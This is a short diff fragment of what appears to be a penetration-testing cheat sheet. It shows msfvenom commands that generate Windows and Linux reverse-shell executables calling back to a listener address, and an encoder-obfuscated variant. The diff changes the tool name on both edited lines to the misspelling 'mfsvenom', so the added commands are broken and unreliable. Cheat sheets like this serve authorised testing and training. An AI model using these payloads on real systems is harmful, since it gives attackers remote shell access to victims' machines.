@@ -353,8 +353,8 @@ msfvenom -p <PAYLOAD> <OPTIONS>
 
 -p {<OS>/<arch>/<payload>}
 #For example
-msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
-msfvemon -p linux/x86/shell/reverse_tcp -f elf -o shell.elf LHOST=<listen-IP> LPORT=<listen-port>
+mfsvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+mfsvenom -p linux/x86/shell/reverse_tcp -f elf -o shell.elf LHOST=<listen-IP> LPORT=<listen-port>
 #Example of -a and --encoder
 msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=ip LPORT=port -f exe -o shell.exe
 ```
